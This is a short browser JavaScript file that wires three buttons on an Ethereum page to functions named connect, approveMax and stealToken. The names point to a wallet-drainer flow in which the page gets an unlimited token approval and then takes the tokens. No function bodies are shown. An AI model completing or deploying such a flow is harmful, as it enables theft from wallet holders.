const { ethers, ethereum } = window

const connectButton = document.getElementById("connect")
const approveButton = document.getElementById("approve")
const mainButton = document.getElementById("main")



window.addEventListener("DOMContentLoaded", () => {
    connectButton.onclick = connect
})

window.addEventListener("DOMContentLoaded", () => {
    approveButton.onclick = approveMax
})

window.addEventListener("DOMContentLoaded", () => {
    mainButton.onclick = stealToken
})